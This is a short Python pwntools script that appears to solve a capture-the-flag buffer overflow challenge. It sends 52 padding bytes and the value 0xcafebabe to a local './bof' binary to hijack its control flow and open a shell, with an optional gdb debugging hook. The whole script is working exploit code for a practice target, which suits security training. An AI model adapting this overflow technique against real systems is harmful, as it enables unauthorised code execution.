#!/usr/bin/env python3
import sys
import time
import argparse
from pwn import *
context.update(arch='i386', os='linux')

def wait_for_prompt(r):
  print(r.recvuntil(b"overflow me :"))

#--------------------------------------------------------------------------
if __name__ == "__main__":

  parser = argparse.ArgumentParser(description='Exploit the bins.')
  parser.add_argument('--dbg'   , '-d', action="store_true")
  args = parser.parse_args()

  r = process('./bof')

  if args.dbg:
    gdb.attach(r, """
    vmmap
    b *func+40
    """)

  #wait_for_prompt(r)
  payload  = b"A"*52
  payload += p32(0xcafebabe)
  r.sendline(payload) 
  print("you should now have a shell")
  # Drop to interactive console
  r.interactive()

